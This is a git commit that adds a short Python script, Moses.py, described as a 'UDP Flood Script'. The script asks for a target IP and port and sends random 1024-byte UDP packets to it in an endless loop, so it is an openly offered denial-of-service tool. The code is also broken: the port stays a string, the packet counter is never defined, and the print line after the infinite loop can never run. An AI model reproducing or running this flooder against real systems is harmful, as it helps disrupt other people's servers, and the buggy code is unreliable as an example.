6be0853d9d153b65eb3360a8ec55853e781d67c2
Maggs <132457151+AntiMaggs@users.noreply.github.com>
2023-06-09 10:31:57 -0400

    Moses
    UDP Flood Script

---
+++ Moses.py
@@ -0,0 +1,12 @@
+import socket 
+import random
+# this works off a simple premise of attacking till you end. Just floods the heck out of a server MAN
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #create the socket
+bytes=random._urandom(1024) #create the packet
+ip=input('Target IP: ') #insert IP to attack
+port=input('Port: ') #port to attack
+
+while 1: #loops sending packets to the port until you end program
+    sock.sendto(bytes,(ip,port))
+print ("Sent %s amount of packets to %s at port %s.") % (sent,ip,port)
+sent= sent + 1
